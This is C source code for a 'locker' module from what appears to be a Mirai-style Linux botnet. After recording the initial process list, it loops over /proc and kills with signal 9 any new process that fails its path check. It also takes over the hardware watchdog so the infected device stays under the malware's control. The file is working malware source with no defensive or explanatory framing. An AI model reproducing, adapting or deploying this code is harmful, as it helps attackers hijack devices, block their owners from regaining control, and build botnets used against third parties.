#ifdef LOCKER
#define _GNU_SOURCE
#ifdef DEBUG
#endif

#include "headers/killer.h"
#include "headers/locker.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/syscalls.h"
#include "../../encryption/chacha20_table.h"

Locker *l_head = NULL;
int watchdog_fd = -1;

static void add_to_list(char *pid)
{
    Locker *node = calloc(1, sizeof(Locker)), *last;

    node->pid = atoi(pid);

    if (l_head == NULL)
    {
        l_head = node;
        return;
    }

    last = l_head;

    while (last->next != NULL)
        last = last->next;

    last->next = node;
}

static char search_list(char *pid)
{
    char found = 0;
    Locker *node = l_head;
    int n_pid = atoi(pid);

    if (n_pid == sys_getpid() || n_pid == sys_getppid())
        return 1;

    while (node != NULL)
    {
        if (n_pid == node->pid)
            return 1;

        node = node->next;
    }

    return 0;
}

static void check_pid(char *pid)
{
    char realpath[256] = {0};

    if (search_list(pid))
        return;

    if (!check_realpath(pid, realpath, 1))
        return add_to_list(pid);

    debug("Killing new pid: %s - Realpath: %s\n", pid, realpath);
    sys_kill(atoi(pid), 9);
}

void locker_create(void)
{
    DIR *dir;
    char scanned = 0;
    struct dirent *file;

    watchdog_fd = sys_open(enc[DEV_WATCHDOG].string, 1 /*O_WRONLY*/, 0);
    if (watchdog_fd != -1) {
        debug("Watchdog opened successfully (fd: %d)\n", watchdog_fd);
        int timeout = 10;
        sys_ioctl(watchdog_fd, 0x40045706 /*WDIOC_SETTIMEOUT*/, &timeout);
    }

    while (1)
    {
        if (watchdog_fd != -1) {
            sys_write(watchdog_fd, enc[NULL_STR].string, 1);
        }

        if ((dir = sys_opendir(enc[KILLER_PROC].string)) == NULL)
        {
            return;
        }

        while ((file = sys_readdir(dir)))
        {
            if (!isdigit(file->d_name[0]))
                continue;

            if (scanned == 0)
                add_to_list(file->d_name);
            else
                check_pid(file->d_name);
        }

        scanned = 1;

        sys_closedir(dir);

        sys_usleep(10 * 100);
    }
}
#endif
